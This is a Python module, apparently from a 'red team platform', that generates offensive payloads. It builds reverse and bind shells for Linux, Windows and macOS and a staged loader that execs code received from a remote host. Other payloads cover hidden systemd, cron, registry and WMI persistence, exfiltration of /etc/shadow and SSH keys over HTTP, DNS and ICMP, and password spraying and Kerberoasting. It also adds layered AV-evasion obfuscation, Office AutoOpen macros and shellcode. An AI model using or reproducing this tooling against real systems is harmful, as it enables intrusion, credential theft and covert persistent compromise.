"""
Red Team Platform - Advanced Payload Generation System
Military-grade payload development and evasion techniques
"""

import os
import base64
import zlib
import random
import string
import hashlib
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class AdvancedPayloadGenerator:
    """Generate sophisticated, evasive payloads for penetration testing"""
    
    def __init__(self):
        self.evasion_techniques = {
            'encoding': ['base64', 'hex', 'url', 'unicode', 'double_encoding'],
            'obfuscation': ['string_splitting', 'variable_substitution', 'dead_code_insertion'],
            'encryption': ['aes256', 'rc4', 'custom_xor'],
            'polymorphism': ['instruction_reordering', 'register_swapping', 'nop_insertion'],
            'anti_debug': ['timing_checks', 'vm_detection', 'debugger_detection'],
            'anti_av': ['signature_breaking', 'behavior_masking', 'runtime_decryption']
        }
        
        self.shellcode_templates = self._load_shellcode_templates()
        self.persistence_methods = self._load_persistence_methods()
        
    def generate_payload(self, payload_config):
        """Generate advanced payload with specified configuration"""
        payload_type = payload_config.get('type', 'reverse_shell')
        target_os = payload_config.get('os', 'linux')
        evasion_level = payload_config.get('evasion_level', 'medium')
        delivery_method = payload_config.get('delivery', 'binary')
        
        # Generate base payload
        base_payload = self._generate_base_payload(payload_type, target_os, payload_config)
        
        # Apply evasion techniques
        evasive_payload = self._apply_evasion_techniques(base_payload, evasion_level)
        
        # Format for delivery
        final_payload = self._format_for_delivery(evasive_payload, delivery_method)
        
        return {
            'payload': final_payload,
            'type': payload_type,
            'target_os': target_os,
            'evasion_level': evasion_level,
            'delivery_method': delivery_method,
            'size': len(final_payload),
            'hash': hashlib.sha256(final_payload.encode()).hexdigest()[:16],
            'instructions': self._generate_deployment_instructions(payload_config)
        }
    
    def _generate_base_payload(self, payload_type, target_os, config):
        """Generate base payload without evasion"""
        if payload_type == 'reverse_shell':
            return self._generate_reverse_shell(target_os, config)
        elif payload_type == 'bind_shell':
            return self._generate_bind_shell(target_os, config)
        elif payload_type == 'meterpreter':
            return self._generate_meterpreter_payload(target_os, config)
        elif payload_type == 'persistence':
            return self._generate_persistence_payload(target_os, config)
        elif payload_type == 'privilege_escalation':
            return self._generate_privesc_payload(target_os, config)
        elif payload_type == 'data_exfiltration':
            return self._generate_exfiltration_payload(target_os, config)
        elif payload_type == 'lateral_movement':
            return self._generate_lateral_payload(target_os, config)
        else:
            return self._generate_custom_payload(payload_type, target_os, config)
    
    def _generate_reverse_shell(self, target_os, config):
        """Generate reverse shell payload"""
        lhost = config.get('lhost', '127.0.0.1')
        lport = config.get('lport', 4444)
        
        if target_os == 'linux':
            return f"""#!/bin/bash
exec 5<>/dev/tcp/{lhost}/{lport}
cat <&5 | while read line; do $line 2>&5 >&5; done
"""
        elif target_os == 'windows':
            return f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
"""
        elif target_os == 'macos':
            return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"""
    
    def _generate_bind_shell(self, target_os, config):
        """Generate bind shell payload"""
        lport = config.get('lport', 4444)
        
        if target_os == 'linux':
            return f"""#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l {lport} >/tmp/f
"""
        elif target_os == 'windows':
            return f"""powershell -nop -c "$listener = [System.Net.Sockets.TcpListener]{lport}; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()"
"""
    
    def _generate_meterpreter_payload(self, target_os, config):
        """Generate Meterpreter-style payload"""
        lhost = config.get('lhost', '127.0.0.1')
        lport = config.get('lport', 4444)
        
        # Advanced multi-stage payload
        stage1 = f"""import socket,struct,time
s=socket.socket()
s.connect(('{lhost}',{lport}))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(d,{{'s':s}})
"""
        
        return stage1
    
    def _generate_persistence_payload(self, target_os, config):
        """Generate persistence payload"""
        if target_os == 'linux':
            return """#!/bin/bash
# Systemd persistence
cat > /tmp/.hidden_service.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.hidden_binary
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

cp /tmp/.hidden_service.service /etc/systemd/system/
systemctl enable .hidden_service.service
systemctl start .hidden_service.service

# Cron persistence
echo "*/5 * * * * /tmp/.hidden_binary" | crontab -
"""
        elif target_os == 'windows':
            return '''# Registry persistence
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\update.exe" /f

# Scheduled task persistence
schtasks /create /tn "SecurityUpdate" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon /ru "SYSTEM" /f

# WMI persistence
$filterName = 'SecurityFilter'
$consumerName = 'SecurityConsumer'
$exePath = 'C:\\Windows\\Temp\\update.exe'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{Name=$consumerName;CommandLineTemplate=$exePath}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
'''
    
    def _generate_privesc_payload(self, target_os, config):
        """Generate privilege escalation payload"""
        if target_os == 'linux':
            return """#!/bin/bash
# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Kernel exploit check
uname -a
cat /proc/version

# Sudo misconfiguration
sudo -l

# Writable /etc/passwd
ls -la /etc/passwd

# Docker escape
if [ -S /var/run/docker.sock ]; then
    docker run -v /:/hostOS -i -t ubuntu chroot /hostOS /bin/bash
fi

# Capabilities exploitation
getcap -r / 2>/dev/null | grep -v "= $"
"""
        elif target_os == 'windows':
            return '''# Windows privilege escalation
whoami /priv
whoami /groups

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\\windows\\\\\\\\" |findstr /i /v ""

# AlwaysInstallElevated check
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Token impersonation check
if ((whoami /priv | findstr /i "SeDebugPrivilege") -or (whoami /priv | findstr /i "SeImpersonatePrivilege")) {
    Write-Host "Token impersonation possible"
}
'''
    
    def _generate_exfiltration_payload(self, target_os, config):
        """Generate data exfiltration payload"""
        exfil_method = config.get('method', 'http')
        target_url = config.get('url', 'http://127.0.0.1:8080/upload')
        
        if exfil_method == 'http':
            return f"""#!/bin/bash
# Data collection
tar -czf /tmp/data.tar.gz /home/*/.ssh /etc/passwd /etc/shadow /var/log/* 2>/dev/null

# HTTP exfiltration
curl -X POST -F "file=@/tmp/data.tar.gz" {target_url}

# DNS exfiltration (base64 encoded)
data=$(base64 -w 0 /tmp/data.tar.gz)
for i in $(seq 0 60 ${{#data}}); do
    chunk=${{data:$i:60}}
    nslookup $chunk.exfil.domain.com
done
"""
        elif exfil_method == 'icmp':
            return """#!/bin/bash
# ICMP exfiltration
file_data=$(xxd -p /tmp/sensitive_data.txt | tr -d '\\n')
target_ip="127.0.0.1"

for i in $(seq 0 32 ${#file_data}); do
    chunk=${file_data:$i:32}
    ping -c 1 -p $chunk $target_ip
done
"""
    
    def _generate_lateral_payload(self, target_os, config):
        """Generate lateral movement payload"""
        return """#!/bin/bash
# Network discovery
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i &
done
wait

# SSH key collection
find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null

# Password spraying
hydra -L users.txt -P passwords.txt ssh://192.168.1.0/24

# SMB enumeration
enum4linux -a 192.168.1.0/24
smbclient -L //192.168.1.0 -N

# Kerberoasting
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request
"""
    
    def _generate_custom_payload(self, payload_type, target_os, config):
        """Generate custom payload"""
        return f"# Custom {payload_type} payload for {target_os}\necho 'Custom payload implementation needed'"
    
    def _apply_evasion_techniques(self, payload, evasion_level):
        """Apply sophisticated evasion techniques"""
        if evasion_level == 'low':
            return self._apply_basic_evasion(payload)
        elif evasion_level == 'medium':
            return self._apply_medium_evasion(payload)
        elif evasion_level == 'high':
            return self._apply_advanced_evasion(payload)
        else:
            return payload
    
    def _apply_basic_evasion(self, payload):
        """Apply basic evasion techniques"""
        # Base64 encoding
        encoded = base64.b64encode(payload.encode()).decode()
        
        return f"""import base64
exec(base64.b64decode('{encoded}').decode())
"""
    
    def _apply_medium_evasion(self, payload):
        """Apply medium-level evasion"""
        # XOR encoding with random key
        key = random.randint(1, 255)
        encoded = ''.join(chr(ord(c) ^ key) for c in payload)
        encoded_b64 = base64.b64encode(encoded.encode('latin-1')).decode()
        
        return f"""import base64
key = {key}
encoded = base64.b64decode('{encoded_b64}').decode('latin-1')
decoded = ''.join(chr(ord(c) ^ key) for c in encoded)
exec(decoded)
"""
    
    def _apply_advanced_evasion(self, payload):
        """Apply advanced evasion techniques"""
        # Multiple layers of encryption and obfuscation
        
        # Layer 1: XOR with rotating key
        key_base = random.randint(1, 255)
        layer1 = ''.join(chr(ord(c) ^ (key_base + i) % 256) for i, c in enumerate(payload))
        
        # Layer 2: Compression
        layer2 = zlib.compress(layer1.encode('latin-1'))
        
        # Layer 3: Base64 encoding
        layer3 = base64.b64encode(layer2).decode()
        
        # Layer 4: String obfuscation
        chunks = [layer3[i:i+10] for i in range(0, len(layer3), 10)]
        obfuscated_chunks = [f'"{chunk}"' for chunk in chunks]
        
        return f"""import base64, zlib
key_base = {key_base}
chunks = [{'+'.join(obfuscated_chunks)}]
layer3 = ''.join(chunks)
layer2 = base64.b64decode(layer3)
layer1 = zlib.decompress(layer2).decode('latin-1')
decoded = ''.join(chr(ord(c) ^ (key_base + i) % 256) for i, c in enumerate(layer1))
exec(decoded)
"""
    
    def _format_for_delivery(self, payload, delivery_method):
        """Format payload for specific delivery method"""
        if delivery_method == 'powershell':
            # PowerShell-specific formatting
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            return f"powershell -EncodedCommand {encoded}"
        
        elif delivery_method == 'javascript':
            # JavaScript formatting for web delivery
            escaped = payload.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')
            return f'eval("{escaped}");'
        
        elif delivery_method == 'binary':
            # Binary executable wrapper
            return self._create_binary_wrapper(payload)
        
        elif delivery_method == 'macro':
            # Office macro formatting
            return self._create_macro_wrapper(payload)
        
        else:
            return payload
    
    def _create_binary_wrapper(self, payload):
        """Create binary executable wrapper"""
        # Simple stub that executes the payload
        escaped_payload = payload.replace('"', '\\"')
        return f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {{
    char payload[] = "{escaped_payload}";
    system(payload);
    return 0;
}}
"""
    
    def _create_macro_wrapper(self, payload):
        """Create Office macro wrapper"""
        return f"""Sub AutoOpen()
    Shell "{payload}", vbHide
End Sub

Sub Document_Open()
    AutoOpen
End Sub
"""
    
    def _generate_deployment_instructions(self, config):
        """Generate deployment instructions for the payload"""
        payload_type = config.get('type', 'reverse_shell')
        delivery_method = config.get('delivery', 'binary')
        target_os = config.get('os', 'linux')
        
        instructions = [
            f"Payload Type: {payload_type}",
            f"Target OS: {target_os}",
            f"Delivery Method: {delivery_method}",
            "",
            "Deployment Steps:"
        ]
        
        if delivery_method == 'binary':
            instructions.extend([
                "1. Compile the payload if necessary",
                "2. Transfer to target system",
                "3. Make executable (chmod +x)",
                "4. Execute payload"
            ])
        elif delivery_method == 'powershell':
            instructions.extend([
                "1. Open PowerShell as Administrator",
                "2. Set execution policy: Set-ExecutionPolicy Bypass",
                "3. Execute the encoded command",
                "4. Restore execution policy if needed"
            ])
        elif delivery_method == 'javascript':
            instructions.extend([
                "1. Inject into web page or browser console",
                "2. Ensure JavaScript is enabled",
                "3. Monitor for callback connection"
            ])
        
        return '\\n'.join(instructions)
    
    def _load_shellcode_templates(self):
        """Load architecture-specific shellcode templates"""
        return {
            'x86': {
                'execve_bin_sh': "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
                'reverse_tcp': "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\\x01\\x68\\x02\\x00\\x11\\x5c\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
            },
            'x64': {
                'execve_bin_sh': "\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05"
            }
        }
    
    def _load_persistence_methods(self):
        """Load OS-specific persistence methods"""
        return {
            'linux': [
                'systemd_service',
                'cron_job',
                'bashrc_modification',
                'ssh_key_injection',
                'library_hijacking'
            ],
            'windows': [
                'registry_run_key',
                'scheduled_task',
                'wmi_subscription',
                'service_creation',
                'dll_hijacking'
            ],
            'macos': [
                'launchd_plist',
                'login_items',
                'dylib_hijacking',
                'bash_profile_modification'
            ]
        }

# Global payload generator instance
payload_generator = AdvancedPayloadGenerator()